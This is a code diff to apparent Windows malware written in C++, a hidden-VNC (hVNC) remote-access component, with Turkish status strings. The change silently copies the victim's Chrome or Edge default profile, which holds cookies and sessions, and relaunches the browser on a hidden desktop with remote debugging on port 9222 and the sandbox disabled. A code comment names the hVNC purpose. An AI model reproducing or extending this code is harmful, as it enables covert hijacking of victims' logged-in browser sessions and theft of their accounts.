@@ -4,6 +4,7 @@
 #include <commctrl.h>
 #include <uxtheme.h>
 #include <dwmapi.h>
+#include <shellapi.h>
 #include <propidl.h>
 #include <gdiplus.h>
 #include <objidl.h>
@@ -1157,8 +1158,21 @@ static wstring get_browser_path(const wstring& browser) {
     return L"";
 }
 
+static bool copy_directory(const wstring& from, const wstring& to) {
+    wstring source = from + L'\0';
+    wstring dest = to + L'\0';
+
+    SHFILEOPSTRUCTW op = { 0 };
+    op.wFunc = FO_COPY;
+    op.pFrom = source.c_str();
+    op.pTo = dest.c_str();
+    op.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_SILENT | FOF_NOERRORUI;
+
+    return SHFileOperationW(&op) == 0;
+}
+
 static void launch_browser_background(wstring browserName) {
-    send_status("Profiller kopyalanıyor...");
+    send_status("Profiller kopyalanıyor, lütfen bekleyin...");
 
     wstring exePath = get_browser_path(browserName);
     if (exePath.empty()) {
@@ -1177,31 +1191,32 @@ static void launch_browser_background(wstring browserName) {
     wchar_t localAppData[MAX_PATH];
     if (GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH)) {
         if (browserName == L"Google Chrome")
-            userDataPath = wstring(localAppData) + L"\\Google\\Chrome\\User Data";
+            userDataPath = wstring(localAppData) + L"\\Google\\Chrome\\User Data\\Default";
         else
-            userDataPath = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
+            userDataPath = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data\\Default";
     }
 
+    wstring targetProfile = targetDir + L"\\Default";
     if (!userDataPath.empty()) {
-        wstring junctionPath = targetDir + L"\\User Data";
-        wstring cmd = L"cmd.exe /c mklink /j \"" + junctionPath + L"\" \"" + userDataPath + L"\"";
-
-        STARTUPINFOW si = { sizeof(si) };
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE;
-        PROCESS_INFORMATION pi = { 0 };
-
-        vector<wchar_t> cmdBuf(cmd.begin(), cmd.end());
-        cmdBuf.push_back(0);
-
-        if (CreateProcessW(NULL, cmdBuf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-            WaitForSingleObject(pi.hProcess, 5000);
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-        }
+        copy_directory(userDataPath, targetProfile);
     }
 
-    wstring args = L" --remote-debugging-port=9222 --no-first-run --no-default-browser-check --user-data-dir=\"" + targetDir + L"\\User Data\" --disable-gpu-compositing --force-cpu-draw --window-size=1280,720";
+    // Modern hVNC için optimize edilmiş Chromium parametreleri
+    wstring args = L" --remote-debugging-port=9222"
+                   L" --no-first-run"
+                   L" --no-default-browser-check"
+                   L" --user-data-dir=\"" + targetDir + L"\""
+                   L" --profile-directory=\"Default\""
+                   L" --disable-gpu"
+                   L" --disable-gpu-compositing"
+                   L" --disable-software-rasterizer"
+                   L" --disable-extensions"
+                   L" --no-sandbox"
+                   L" --disable-dev-shm-usage"
+                   L" --disable-setuid-sandbox"
+                   L" --force-cpu-draw"
+                   L" --window-size=1280,720";
+
     wstring fullCmd = L"\"" + exePath + L"\"" + args;
 
     ensure_desktop();
